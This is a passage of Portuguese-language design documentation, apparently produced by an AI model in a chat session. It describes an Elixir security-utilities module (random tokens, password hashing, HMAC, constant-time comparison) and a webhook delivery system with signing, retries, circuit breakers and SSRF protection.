**Importante:** Este módulo é para utilitários *genéricos*. Operações de segurança mais complexas ou específicas de um domínio (como gerenciamento de chaves de criptografia, fluxos de autenticação completos, políticas de segurança) devem residir em seus respectivos módulos Core ou de Segurança (ex: `Core.EncryptionService`, `Auth`, `SecurityPolicyManager`).

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Geração de Dados Aleatórios Criptograficamente Seguros:**
    *   Gerar sequências de bytes aleatórios usando fontes seguras (ex: `:crypto.strong_rand_bytes/1`).
    *   Fornecer funções para gerar tokens/strings aleatórias em diferentes formatos (hexadecimal, base64, base64url) e comprimentos, adequados para IDs de sessão, tokens de CSRF, tokens de reset de senha, etc. (`generate_token/2`).
    *   Gerar Identificadores Únicos Universais (UUIDs) seguros (v4) (`generate_id/1` com opção `:uuid`).
    *   Gerar códigos de recuperação ou One-Time Passwords (OTPs) numéricos ou alfanuméricos simples, com comprimento configurável (`generate_recovery_code/2`).
*   **Hashing de Senhas (Implementação Básica/Primitiva):**
    *   Fornecer uma função para gerar um hash seguro de uma senha usando um algoritmo forte e salt (`hash_password/2`).
    *   Fornecer uma função para verificar uma senha contra um hash armazenado (`verify_password/2`).
    *(Nota: A lógica principal de hashing de senha, incluindo seleção de algoritmo, gerenciamento de custo/iterações e políticas, deve residir em `DeeperHub.Auth.Services.PasswordService` ou ser parte de `DeeperHub.Core.EncryptionService`. As funções aqui seriam implementações mais diretas de um algoritmo específico, se necessário como utilitário genérico, mas geralmente essa responsabilidade é mais centralizada).*
*   **Operações HMAC (Hash-based Message Authentication Code):**
    *   Gerar um HMAC para verificar a integridade e autenticidade de dados usando uma chave secreta compartilhada (`generate_hmac/3`).
    *   Verificar um HMAC contra dados e uma chave (`verify_hmac/4`).
*   **Comparação Segura de Tempo Constante:**
    *   Fornecer uma função para comparar duas strings (ex: tokens, hashes de senha, assinaturas) de uma maneira que o tempo de execução não dependa do número de caracteres que correspondem no início da string. Isso é crucial para prevenir ataques de timing (`secure_compare/2`).
*   **Geração de Chaves de Assinatura Simples:**
    *   Gerar chaves aleatórias de um tamanho específico, adequadas para uso como segredos de assinatura HMAC ou para tokens JWT simétricos (HS256/HS512) (`generate_signing_key/0`). (Gerenciamento de chaves mais complexo, incluindo rotação e armazenamento seguro, estaria em `DeeperHub.Core.EncryptionService` e seu `KeyManagementService`).
*   **Avaliação de Risco Simplificada (Stub/Exemplo da Doc Original):**
    *   A função `evaluate_risk/1` mencionada na documentação original (que calcula um score agregado simples) seria mais um exemplo conceitual aqui. A lógica robusta de avaliação de risco reside em `DeeperHub.Security.RiskAssessment`.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

*   **`DeeperHub.Shared.Utils.SecurityUtils` (Módulo Funcional):**
    *   Contém todas as funções de utilidade de segurança.
    *   Utiliza primariamente o módulo `:crypto` do Erlang/OTP para operações criptográficas fundamentais (geração de bytes aleatórios, funções de hash, HMAC).
    *   Pode usar `Plug.Crypto.secure_compare/2` para comparação em tempo constante.
    *   Para hashing de senhas, se implementado aqui, usaria uma biblioteca como `Argon2_elixir`, `Bcrypt_elixir`, ou `Pbkdf2_elixir` (que são wrappers sobre `Comeonin`).

### 3.2. Estrutura de Diretórios

```
lib/deeper_hub/shared/utils/security_utils.ex
```

### 3.3. Decisões de Design Importantes

*   **Foco em Primitivas Seguras:** O módulo deve fornecer blocos de construção que são seguros por si mesmos, com base em padrões da indústria e nas capacidades do Erlang/Elixir.
*   **Sem Gerenciamento de Estado:** As funções aqui devem ser puras ou stateless. Este módulo não gerencia chaves, tokens ativos, ou estado de segurança.
*   **Clareza sobre o Propósito:** A documentação de cada função deve ser explícita sobre seu propósito, nível de segurança e quando *não* deve ser usada (ex: `generate_recovery_code` não é para senhas).
*   **Evitar Criptografia \"Caseira\":** Não implementar algoritmos criptográficos do zero. Usar as implementações fornecidas pelo `:crypto` ou por bibliotecas bem estabelecidas e auditadas.

## 🛠️ 4. Casos de Uso Principais

*   **Módulo `DeeperHub.Tokens`:**
    *   Usa `SecurityUtils.generate_token/2` para criar a parte aleatória de tokens opacos (ex: tokens de API, tokens de sessão se não forem JWTs completos).
    *   Usa `SecurityUtils.generate_signing_key/0` para gerar um segredo para assinar JWTs (se o segredo for gerenciado dinamicamente e não apenas por config).
*   **Módulo `DeeperHub.Recovery`:**
    *   Usa `SecurityUtils.generate_token/2` para criar tokens de reset de senha e verificação de email.
    *   Usa `SecurityUtils.generate_recovery_code/2` para gerar códigos de recuperação numéricos/alfanuméricos para MFA.
*   **Módulo `DeeperHub.Auth.Services.PasswordService` (ou este módulo, se centralizar):**
    *   Usa `SecurityUtils.hash_password/2` e `SecurityUtils.verify_password/2`.
*   **Módulo `DeeperHub.Webhooks.PayloadSigner`:**
    *   Usa `SecurityUtils.generate_hmac/3` para assinar payloads de webhook.
*   **Comparação de Tokens Secretos:**
    *   Qualquer módulo que precise comparar um token fornecido pelo cliente com um valor armazenado (ex: token de CSRF, token de API) deve usar `SecurityUtils.secure_compare/2`.

## 🌊 5. Fluxos Importantes

Não aplicável no mesmo sentido que módulos com estado. O fluxo é a chamada de uma função e o retorno do seu resultado.

## 📡 6. API (Funções Públicas do Módulo)

*(Refinando e consolidando a partir da documentação original e das necessidades inferidas)*

### 6.1. Geração de Aleatoriedade

*   **`DeeperHub.Shared.Utils.SecurityUtils.generate_random_bytes(length_bytes :: pos_integer()) :: binary()`** (Nova Sugestão)
    *   **Descrição:** Retorna `length_bytes` de bytes aleatórios criptograficamente seguros. Wrapper direto para `:crypto.strong_rand_bytes/1`.
*   **`DeeperHub.Shared.Utils.SecurityUtils.generate_token(length_bytes :: pos_integer() \\\\ 32, format :: :hex | :base64 | :base64url | :binary \\\\ :base64url) :: String.t() | binary()`**
    *   **Descrição:** Gera uma string ou binário aleatório seguro. Usa `generate_random_bytes/1` internamente.
*   **`DeeperHub.Shared.Utils.SecurityUtils.generate_id(format :: :uuid | :prefixed_random_hex | :prefixed_random_base64url, opts :: keyword() \\\\ []) :: String.t()`** (Revisado)
    *   **Descrição:** Gera um identificador único.
        *   `:uuid`: UUID v4 (via `Ecto.UUID.generate()` ou similar).
        *   `:prefixed_random_hex`: `opts[:prefix] <> hex_encoded_random_bytes(opts[:bytes_length] || 16)`.
        *   `:prefixed_random_base64url`: `opts[:prefix] <> base64url_encoded_random_bytes(opts[:bytes_length] || 16)`.
    *   **`opts`:** `:prefix` (String.t), `:bytes_length` (pos_integer).
*   **`DeeperHub.Shared.Utils.SecurityUtils.generate_recovery_code(length :: pos_integer() \\\\ 6, format :: :numeric | :alphanumeric_upper | :alphanumeric_mixed \\\\ :numeric) :: String.t()`**
    *   **Descrição:** Gera um código simples para recuperação ou OTP.

### 6.2. Hashing de Senhas

*   **`DeeperHub.Shared.Utils.SecurityUtils.hash_password(password :: String.t(), opts :: keyword()) :: {:ok, String.t()} | {:error, term()}`**
    *   **Descrição:** Gera um hash seguro de senha (ex: Argon2id).
    *   **`opts`:** Opções específicas do algoritmo (custo, etc.).
    *   **Retorno:** String do hash (inclui salt e parâmetros) ou erro.
*   **`DeeperHub.Shared.Utils.SecurityUtils.verify_password(password :: String.t(), stored_hash :: String.t()) :: boolean()`**
    *   **Descrição:** Verifica se a `password` corresponde ao `stored_hash`.

### 6.3. HMAC

*   **`DeeperHub.Shared.Utils.SecurityUtils.generate_hmac(data :: String.t() | binary(), key :: binary(), opts :: keyword()) :: {:ok, String.t()} | {:error, term()}`**
    *   **`opts`:** `:algorithm` (atom, Padrão: `:sha256`), `:output_format` (atom, Padrão: `:hex`).
*   **`DeeperHub.Shared.Utils.SecurityUtils.verify_hmac(data :: String.t() | binary(), hmac_to_verify :: String.t(), key :: binary(), opts :: keyword()) :: boolean()`**
    *   **`opts`:** Mesmas de `generate_hmac/3`.

### 6.4. Comparação Segura

*   **`DeeperHub.Shared.Utils.SecurityUtils.secure_compare(string1 :: String.t(), string2 :: String.t()) :: boolean()`**
    *   **Descrição:** Compara duas strings em tempo constante.

### 6.5. Geração de Chave Simples

*   **`DeeperHub.Shared.Utils.SecurityUtils.generate_signing_key(length_bytes :: pos_integer() \\\\ 32) :: binary()`**
    *   **Descrição:** Gera uma chave aleatória adequada para HMAC ou JWT simétrico.

## ⚙️ 7. Configuração

Geralmente, este módulo não armazena configurações, mas pode *ler* configurações globais do `Core.ConfigManager` para definir padrões para algoritmos ou comprimentos, se necessário. Por exemplo:

*   `[:security, :utils, :default_token_bytes_length]` (Integer)
*   `[:security, :utils, :password_hash_algorithm]` (Atom) - Embora isso deva ser gerenciado pelo `PasswordService`.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager` (para padrões configuráveis, se houver).

### 8.2. Bibliotecas Externas

*   `:crypto` (Erlang OTP) - Essencial.
*   `Plug.Crypto` - Para `secure_compare/2`.
*   Bibliotecas de hashing de senha como `argon2_elixir`, `bcrypt_elixir` (geralmente via `Comeonin`) - Se o hashing de senha for feito aqui.

## 🤝 9. Como Usar / Integração

Estes utilitários são chamados por outros módulos que implementam funcionalidades de segurança de mais alto nível.

```elixir
# Em DeeperHub.Tokens.Services.ApiTokenService
def generate_new_api_token_value() do
  DeeperHub.Shared.Utils.SecurityUtils.generate_token(32, :base64url) # Gera um token de ~43 caracteres
end

# Em um Plug de verificação de assinatura de webhook
def verify_webhook_request(payload, received_signature, secret_key) do
  case DeeperHub.Shared.Utils.SecurityUtils.generate_hmac(payload, secret_key) do
    {:ok, calculated_signature} ->
      DeeperHub.Shared.Utils.SecurityUtils.secure_compare(received_signature, calculated_signature)
    _ ->
      false
  end
end
```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   **Geração Aleatória:**
    *   Verificar se `generate_token` e `generate_id` produzem saídas do formato e comprimento corretos.
    *   Verificar se chamadas repetidas produzem valores diferentes (probabilisticamente).
*   **Hashing de Senha:**
    *   `hash_password` produz um hash.
    *   `verify_password` retorna `true` para a senha correta e `false` para incorreta.
    *   `hash_password` para a mesma senha com salts diferentes (comportamento padrão) produz hashes diferentes.
*   **HMAC:**
    *   `generate_hmac` produz um HMAC.
    *   `verify_hmac` retorna `true` para dados, chave e HMAC corretos, e `false` se qualquer um deles for alterado.
*   **Secure Compare:**
    *   Verificar se retorna `true` para strings idênticas e `false` para diferentes. (O teste de tempo constante é difícil em testes unitários, confia-se na biblioteca subjacente).
*   Localização: `test/deeper_hub/shared/utils/security_utils_test.exs`.

### 10.2. Métricas / 10.3. Logs / 10.4. Telemetria

Geralmente não aplicável para um módulo de utilitários puros, a menos que uma operação específica seja muito custosa e precise de instrumentação (ex: hashing de senha com alto custo). Nesse caso, o chamador ou a própria função poderiam emitir métricas de duração.

## ❌ 11. Tratamento de Erros

*   Funções devem lidar com entradas inválidas (ex: `nil` para `password` em `hash_password`) levantando `ArgumentError` ou retornando tuplas de erro claramente documentadas.
*   Falhas em operações criptográficas subjacentes (raro, mas possível) devem ser propagadas ou tratadas de forma segura.

## 🛡️ 12. Considerações de Segurança (do próprio Módulo)

*   **Fonte de Aleatoriedade:** A base de muitos tokens e chaves. Usar `:crypto.strong_rand_bytes/1` é fundamental.
*   **Algoritmos:** Usar apenas algoritmos criptográficos padrão da indústria e bem vetados. Não inventar criptografia.
*   **Gerenciamento de Chaves:** Este módulo pode *gerar* chaves simples, mas não é responsável por seu *armazenamento seguro* ou *rotação*. Isso é tarefa do `DeeperHub.Core.EncryptionService` ou de um KMS.
*   **Comparação em Tempo Constante:** Crítico para evitar vazamento de informação através de análise de tempo de resposta.

## 🧑‍💻 13. Contribuição

*   Qualquer nova função com implicações criptográficas deve ser cuidadosamente revisada.
*   Priorizar o uso de funcionalidades existentes no `:crypto` ou em bibliotecas de segurança bem estabelecidas.
*   Manter a documentação precisa sobre as garantias de segurança de cada função.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Adicionar wrappers para outras primitivas úteis do `:crypto` se houver demanda (ex: funções de derivação de chave como HKDF, se não cobertas por `Core.EncryptionService`).
*   [ ] Fornecer utilitários para encoding/decoding seguro de dados para diferentes contextos (ex: escaping seguro para LDAP, XML, se necessário).
*   [ ] Se o hashing de senhas for mantido aqui, adicionar suporte configurável para diferentes algoritmos e parâmetros de custo.

---

*Última atualização: 2025-05-12*

---

Com isso, encerramos a documentação dos módulos em `DeeperHub.Shared.Utils`. Cobrimos uma boa parte da infraestrutura Core e da camada de Segurança!

Para o próximo, sugiro irmos para um módulo de domínio mais complexo que ainda não detalhamos, como `DeeperHub.OAuth` ou `DeeperHub.Webhooks`. Qual sua preferência?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue
"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, já detalhamos `DeeperHub.OAuth`.

Vamos então para `DeeperHub.Webhooks`. Este módulo é fundamental para permitir que o DeeperHub se comunique proativamente com sistemas externos quando eventos específicos ocorrem.

---

# Módulo: `DeeperHub.Webhooks` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Webhooks`

O módulo `DeeperHub.Webhooks` é responsável por gerenciar e entregar **webhooks** para URLs de endpoints externos configurados por clientes ou outros sistemas. Webhooks são callbacks HTTP (geralmente POST) que o DeeperHub dispara automaticamente quando eventos específicos ocorrem na plataforma (ex: um novo usuário se registra, um pagamento é concluído, um servidor muda de status).

Este sistema permite integrações em tempo real e fluxos de trabalho automatizados entre o DeeperHub e aplicações de terceiros, sem a necessidade de polling constante. Ele lida com o registro de webhooks, a formatação de payloads, o envio seguro, o tratamento de respostas, retentativas e o monitoramento da saúde dos endpoints. 😊

*(Nota: A documentação original tem `DeeperHub.Webhooks` como módulo principal, e vários submódulos como `Dispatcher`, `Event`, `Integrations`, `Monitor`, `PayloadSigner`, `Scheduler`, `Schema`, `Services`, `Workers`. Esta documentação consolida a fachada principal em `DeeperHub.Webhooks` e organiza os componentes internos.)*

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Registro e Gerenciamento de Webhooks (`register_webhook/5`, `update_webhook/2`, `delete_webhook/1`, `list_webhooks/2`):**
    *   Permitir que clientes (ou administradores) registrem URLs de endpoint para receber notificações de tipos de eventos específicos.
    *   Armazenar a URL, os tipos de eventos inscritos, um segredo opcional para assinatura de payload, e cabeçalhos customizados.
    *   Ativar/desativar webhooks.
*   **Processamento de Eventos do Sistema:**
    *   Escutar eventos do `DeeperHub.Core.EventBus` que podem disparar webhooks.
    *   Filtrar eventos para encontrar webhooks registrados para aquele tipo de evento.
*   **Formatação de Payload (`Event` module):**
    *   Construir um payload JSON padronizado para cada evento de webhook, incluindo o tipo de evento, dados do evento e metadados (ID do evento, timestamp).
    *   Filtrar dados sensíveis do payload antes do envio.
*   **Assinatura de Payload (`PayloadSigner`):**
    *   Assinar o payload do webhook (ex: usando HMAC-SHA256 com o segredo do webhook) e incluir a assinatura em um header (ex: `X-DeeperHub-Signature`) para que o receptor possa verificar a autenticidade.
*   **Envio de Webhooks (`Dispatcher`, `DispatcherWithCircuitBreaker`):**
    *   Enviar o payload JSON como uma requisição HTTP POST para a URL do webhook registrado.
    *   Lidar com timeouts e erros de conexão.
    *   Usar Circuit Breakers para proteger o DeeperHub de endpoints de webhook lentos ou que falham repetidamente.
*   **Tratamento de Respostas e Retentativas (`Dispatcher`, `Scheduler`):**
    *   Registrar a resposta do endpoint do webhook (código de status, corpo).
    *   Implementar uma política de retentativa configurável (com backoff exponencial) para webhooks que falham (ex: retornam status 5xx ou timeout).
    *   Marcar um webhook como desativado automaticamente após um número excessivo de falhas consecutivas.
*   **Monitoramento de Saúde de Webhooks (`Monitor`, `AutoHealing`, `HealthCheckWorker`):**
    *   Monitorar a taxa de sucesso/falha de cada endpoint de webhook.
    *   Enviar pings de teste para verificar a saúde de endpoints.
    *   (Opcional) Tentar reativar automaticamente webhooks desativados após um período, se eles voltarem a responder com sucesso.
*   **Histórico e Logs de Entrega (`Schema.WebhookEvent`):**
    *   Manter um histórico de todas as tentativas de entrega de webhooks, incluindo status, respostas e erros.
    *   Permitir que clientes visualizem o histórico de entregas para seus webhooks.
*   **Segurança:**
    *   Verificação de assinatura no lado do receptor (responsabilidade do cliente, mas o DeeperHub fornece a assinatura).
    *   Proteção contra SSRF ao validar URLs de webhook.
    *   Envio apenas sobre HTTPS.
*   **Observabilidade (`Telemetry`, `Integrations.AuditIntegration`):**
    *   Métricas sobre número de webhooks disparados, taxas de sucesso/falha, latências.
    *   Logs detalhados do ciclo de vida do webhook.
    *   Auditoria de registro e modificação de webhooks.
*   **Limpeza de Dados (`Workers.CleanupWorker`):**
    *   Remover logs de eventos de webhook antigos.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Webhooks` (Fachada Pública):**
    *   Ponto de entrada para registrar webhooks e, potencialmente, para disparar eventos manualmente para teste.
    *   Delega para o `WebhooksService`.
2.  **`DeeperHub.Webhooks.Services.WebhookService`:**
    *   **Responsabilidade:** Gerencia o CRUD de definições de `WebhookSchema`.
    *   Recebe eventos do `Core.EventBus` (via `EventListener` interno ou por ser um assinante direto).
    *   Para cada evento, encontra os `WebhookSchema`s correspondentes.
    *   Prepara o `WebhookEventSchema` (payload, assinatura).
    *   Enfileira o `WebhookEvent` para entrega pelo `Dispatcher` (ex: usando `Core.BackgroundTaskManager` ou uma fila interna).
3.  **`DeeperHub.Webhooks.Schema.WebhookSchema`:**
    *   Armazena: `id`, `client_id` (ou `user_id` do proprietário), `url` (endpoint), `event_types` (lista de eventos inscritos), `secret` (criptografado), `custom_headers` (mapa), `is_active`, `failure_count`, `last_successful_delivery_at`, `last_failure_at`.
4.  **`DeeperHub.Webhooks.Schema.WebhookEventSchema`:**
    *   Armazena: `id`, `webhook_id`, `event_type`, `payload_sent` (JSON), `status` (`:pending`, `:delivered`, `:failed_retryable`, `:failed_permanent`), `attempts`, `next_retry_at`, `last_response_code`, `last_response_body_sample`.
5.  **`DeeperHub.Webhooks.Event` (Módulo Funcional):**
    *   Define os tipos de eventos suportados.
    *   Formata o payload do evento, incluindo filtragem de dados sensíveis.
6.  **`DeeperHub.Webhooks.PayloadSigner` (Módulo Funcional):**
    *   Gera a assinatura HMAC para o payload.
7.  **`DeeperHub.Webhooks.Dispatcher` (GenServer ou Pool de Workers via `Core.BackgroundTaskManager`):**
    *   **Responsabilidade:** Pega `WebhookEventSchema`s da fila e tenta enviá-los.
    *   Usa `DispatcherWithCircuitBreaker` para fazer a chamada HTTP.
    *   Atualiza o `WebhookEventSchema` com o resultado.
    *   Se falhar, e for `retryable`, atualiza `attempts` e `next_retry_at`.
    *   Se falhar permanentemente ou exceder tentativas, marca como `:failed_permanent`.
    *   Se sucesso, marca como `:delivered`.
8.  **`DeeperHub.Webhooks.DispatcherWithCircuitBreaker`:**
    *   Encapsula a chamada HTTP para o endpoint do webhook usando `Core.HTTPClient` e `Core.CircuitBreaker`.
9.  **`DeeperHub.Webhooks.Scheduler` (GenServer):**
    *   Periodicamente verifica `WebhookEventSchema`s que estão prontos para retentativa e os re-enfileira para o `Dispatcher`.
10. **`DeeperHub.Webhooks.Monitor` e `AutoHealing` (GenServers) / `HealthCheckWorker`:**
    *   Monitoram a saúde dos endpoints de `WebhookSchema` (taxa de falha, timeouts).
    *   Podem desativar webhooks que falham consistentemente.
    *   `AutoHealing` pode tentar reativar webhooks desativados.
11. **Workers (`CleanupWorker`, `HealthCheckWorker`):**
    *   `CleanupWorker`: Remove `WebhookEventSchema`s antigos.
    *   `HealthCheckWorker`: Envia pings periódicos para endpoints de webhook.
12. **Integrações (`AuditIntegration`, `Integrations.EventIntegration` para consumir do Core, `Telemetry`):**

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/webhooks/
├── webhooks.ex                       # Fachada Pública
│
├── services/
│   ├── webhook_service.ex            # Gerencia CRUD de WebhookSchema, recebe eventos
│   └── (Outros serviços internos se necessário)
│
├── schemas/                          # (Ou schema/)
│   ├── webhook_schema.ex
│   └── webhook_event_schema.ex
│
├── event.ex                          # Lógica de formatação de payload de evento
├── payload_signer.ex                 # Lógica de assinatura
├── dispatcher.ex                     # GenServer/Worker que envia HTTP
├── dispatcher_with_circuit_breaker.ex # Wrapper com Circuit Breaker
├── scheduler.ex                      # GenServer para agendar retries
├── monitor.ex                        # GenServer para monitorar saúde
├── auto_healing.ex                   # GenServer para tentar reativar
│
├── workers/
│   ├── cleanup_worker.ex
│   └── health_check_worker.ex
│
├── integrations/
│   ├── audit_integration.ex
│   └── (EventListener para Core.EventBus se WebhookService não for o listener direto)
│
├── supervisor.ex                     # Supervisor para todos os GenServers de Webhooks
└── telemetry.ex
```

### 3.3. Decisões de Design Importantes

*   **Assincronicidade:** O envio de webhooks deve ser totalmente assíncrono para não bloquear o processo que gerou o evento original.
*   **Resiliência:** Retentativas com backoff exponencial e circuit breakers são cruciais para lidar com endpoints externos instáveis.
*   **Segurança da Assinatura:** O segredo do webhook deve ser armazenado de forma segura (criptografado) e usado para gerar uma assinatura forte (HMAC-SHA256).
*   **Validação de URL:** Validar URLs de webhook para prevenir SSRF e garantir que sejam URLs HTTP/HTTPS válidas.
*   **Isolamento:** Falhas na entrega de um webhook para um cliente não devem afetar outros clientes ou outros webhooks.

## 🛠️ 4. Casos de Uso Principais

*   **Cliente Registra um Webhook para \"pagamento.concluido\":**
    *   Cliente usa a UI/API para registrar `https://meuservico.com/webhook/deeperhub` para o evento `pagamento.concluido`, fornecendo um segredo.
    *   `Webhooks.register_webhook(...)` salva essa configuração.
*   **Pagamento é Concluído no DeeperHub:**
    *   `DeeperHub.Payments` publica `Core.EventBus.publish(\"pagamento.concluido\", payload_do_pagamento)`.
    *   `WebhookService` (ou seu `EventListener`) recebe o evento.
    *   Encontra o webhook registrado para \"pagamento.concluido\".
    *   Formata o payload, assina-o com o segredo do cliente.
    *   Cria um `WebhookEventSchema` e o enfileira para o `Dispatcher`.
*   **`Dispatcher` Envia o Webhook:**
    *   Pega o evento da fila.
    *   Usa `DispatcherWithCircuitBreaker` para fazer POST para `https://meuservico.com/webhook/deeperhub`.
    *   Se sucesso (ex: 200 OK), marca `WebhookEventSchema` como `:delivered`.
    *   Se falha (ex: 503 Service Unavailable), marca como `:failed_retryable` e o `Scheduler` tentará novamente mais tarde.
*   **Webhook Falha Repetidamente:**
    *   Após N falhas, o `Monitor` ou `Dispatcher` marca o `WebhookSchema` como `is_active: false`.
    *   Uma notificação é enviada ao cliente.

## 🌊 5. Fluxos Importantes

### Fluxo de Disparo de Webhook após Evento do Sistema

1.  **`Core.EventBus`:** Publica um evento (ex: `\"user.created\"`).
2.  **`WebhookService` (ou seu `EventListener`):**
    *   Recebe o evento do `Core.EventBus`.
    *   Consulta o `Core.Repo` (via `Storage`) por todos os `WebhookSchema`s ativos que estão inscritos no tipo de evento `\"user.created\"`.
3.  **Para cada `WebhookSchema` correspondente:**
    *   **`WebhookService`:**
        *   Chama `DeeperHub.Webhooks.Event.create_payload(event_type, original_payload)` para formatar e filtrar o payload.
        *   Chama `DeeperHub.Webhooks.PayloadSigner.sign(formatted_payload, webhook.secret)` para gerar a assinatura.
        *   Cria uma nova entrada `WebhookEventSchema` com status `:pending`, `webhook_id`, `event_type`, `payload_sent`, `signature_header_value`.
        *   Enfileira o `webhook_event_id` para o `DeeperHub.Webhooks.Dispatcher` (ex: usando `Core.BackgroundTaskManager`).
4.  **`Dispatcher` (Worker):**
    *   Pega um `webhook_event_id` da fila.
    *   Busca o `WebhookEventSchema` e o `WebhookSchema` associado.
    *   Chama `DispatcherWithCircuitBreaker.dispatch_webhook(webhook_schema.url, webhook_event.payload_sent, %{headers: %{\"X-DeeperHub-Signature\" => webhook_event.signature_header_value, ...}, method: \"POST\"})`.
5.  **`DispatcherWithCircuitBreaker`:**
    *   Verifica o estado do circuit breaker para a URL do webhook.
    *   Se fechado/meio-aberto, faz a chamada HTTP via `Core.HTTPClient`.
6.  **Resultado da Chamada HTTP:**
    *   **Sucesso (ex: 2xx):** `Dispatcher` atualiza `WebhookEventSchema` para `:delivered`, registra `response_code`. Atualiza `WebhookSchema` com `last_successful_delivery_at`, reseta `failure_count`.
    *   **Falha Retryable (ex: 5xx, timeout):** `Dispatcher` atualiza `WebhookEventSchema` para `:failed_retryable`, incrementa `attempts`, calcula `next_retry_at`. Atualiza `WebhookSchema` com `last_failure_at`, incrementa `failure_count`. Se `failure_count` exceder limiar, `Monitor` pode desativar o `WebhookSchema`.
    *   **Falha Permanente (ex: 4xx, exceto 429):** `Dispatcher` atualiza `WebhookEventSchema` para `:failed_permanent`.
7.  **`Scheduler`:** Periodicamente, busca `WebhookEventSchema`s com status `:failed_retryable` cujo `next_retry_at` já passou e os re-enfileira para o `Dispatcher`.

## 📡 6. API (Funções Públicas da Fachada `DeeperHub.Webhooks`)

### 6.1. Gerenciamento de Webhooks

*   **`DeeperHub.Webhooks.register_webhook(client_id :: String.t(), url :: String.t(), event_types :: list(String.t()), opts :: keyword()) :: {:ok, WebhookSchema.t()} | {:error, Ecto.Changeset.t() | term()}`**
    *   `opts`: `:secret` (String.t, será criptografado), `:custom_headers` (map), `:description` (String.t).
*   **`DeeperHub.Webhooks.update_webhook(webhook_id :: String.t(), client_id :: String.t(), attrs :: map()) :: {:ok, WebhookSchema.t()} | {:error, Ecto.Changeset.t() | :unauthorized}`**
    *   `attrs`: Pode atualizar `url`, `event_types`, `secret`, `custom_headers`, `is_active`.
*   **`DeeperHub.Webhooks.delete_webhook(webhook_id :: String.t(), client_id :: String.t()) :: :ok | {:error, :unauthorized | :not_found}`**
*   **`DeeperHub.Webhooks.get_webhook(webhook_id :: String.t(), client_id :: String.t()) :: {:ok, WebhookSchema.t() | nil}`**
*   **`DeeperHub.Webhooks.list_webhooks_for_client(client_id :: String.t(), filters :: map(), opts :: keyword()) :: {:ok, list(WebhookSchema.t()), Pagination.t()}`**
    *   `filters`: `:is_active`, `:event_type`.

### 6.2. Histórico de Eventos e Diagnóstico

*   **`DeeperHub.Webhooks.list_webhook_events(webhook_id :: String.t(), client_id :: String.t(), filters :: map(), opts :: keyword()) :: {:ok, list(WebhookEventSchema.t()), Pagination.t()}`**
    *   `filters`: `:status` (`:pending`, `:delivered`, `:failed_retryable`, `:failed_permanent`), `:event_type`, `date_range`.
*   **`DeeperHub.Webhooks.get_webhook_event_details(webhook_event_id :: String.t(), client_id :: String.t()) :: {:ok, WebhookEventSchema.t() | nil}`**
*   **`DeeperHub.Webhooks.resend_webhook_event(webhook_event_id :: String.t(), client_id :: String.t()) :: {:ok, :enqueued} | {:error, :not_retryable | term()}`** (Nova Sugestão)
*   **`DeeperHub.Webhooks.check_webhook_health(webhook_id :: String.t(), client_id :: String.t()) :: {:ok, %{status: atom(), last_success: DateTime.t() | nil, last_failure: DateTime.t() | nil, consecutive_failures: integer()}}`** (Envia um ping de teste).

### 6.3. Disparo Manual (para Testes por Clientes)

*   **`DeeperHub.Webhooks.trigger_test_event(webhook_id :: String.t(), client_id :: String.t(), event_type :: String.t() | nil, custom_payload :: map() | nil) :: {:ok, :event_enqueued} | {:error, term()}`**

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager`:

*   **`[:webhooks, :enabled]`** (Boolean): Habilita/desabilita o sistema de webhooks.
*   **`[:webhooks, :default_signature_algorithm]`** (Atom): Ex: `:hmac_sha256`.
*   **`[:webhooks, :default_http_timeout_ms]`** (Integer): Timeout padrão para chamadas HTTP. (Padrão: `5000`)
*   **`[:webhooks, :retry_policy, :max_attempts]`** (Integer): Máximo de retentativas. (Padrão: `5`)
*   **`[:webhooks, :retry_policy, :base_delay_seconds]`** (Integer): Atraso base para primeira retentativa.
*   **`[:webhooks, :retry_policy, :max_delay_seconds]`** (Integer): Atraso máximo entre retentativas.
*   **`[:webhooks, :retry_policy, :backoff_factor]`** (Float): Fator para backoff exponencial.
*   **`[:webhooks, :auto_deactivation, :enabled]`** (Boolean): Se desativa webhooks automaticamente após muitas falhas.
*   **`[:webhooks, :auto_deactivation, :failure_threshold]`** (Integer): Número de falhas consecutivas para desativar.
*   **`[:webhooks, :health_check, :interval_minutes]`** (Integer): Intervalo para `HealthCheckWorker`.
*   **`[:webhooks, :cleanup_worker, :event_log_retention_days]`** (Integer).
*   **`[:webhooks, :max_payload_size_kb]`** (Integer): Tamanho máximo do payload.
*   **`[:webhooks, :allowed_url_schemes]`** (List de Strings): Ex: `[\"https\", \"http\"]`. (Padrão: `[\"https\"]`)
*   **`[:webhooks, :disallowed_ip_ranges_for_url]`** (List de Strings): Ranges CIDR para os quais as URLs de webhook não podem resolver (proteção SSRF). Ex: `[\"127.0.0.0/8\", \"10.0.0.0/8\", \"172.16.0.0/12\", \"192.168.0.0/16\", \"::1/128\"]`.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.*`: Todos os módulos Core.
*   `DeeperHub.Auth`/`RBAC`: Para autorizar quem pode registrar/gerenciar webhooks.
*   `DeeperHub.Accounts`: Para associar webhooks a `client_id` (que pode ser um `user_id` ou um ID de aplicação cliente).
*   `DeeperHub.Core.EncryptionService`: Para criptografar segredos de webhook.
*   `DeeperHub.Security.SSRFProtection` (Implícito/Integrado): A validação de URL deve proteger contra Server-Side Request Forgery.

### 8.2. Bibliotecas Externas

*   `Jason`: Para payloads JSON.
*   Biblioteca HTTP Client (ex: `Finch`, `HTTPoison`) usada pelo `Core.HTTPClient`.
*   Biblioteca CRON para o `Scheduler` e workers (ex: `Quantum`).

## 🤝 9. Como Usar / Integração

*   **UI de Desenvolvedor/Cliente:** Fornecer uma interface para clientes registrarem e gerenciarem seus webhooks, visualizarem histórico de entregas e segredos.
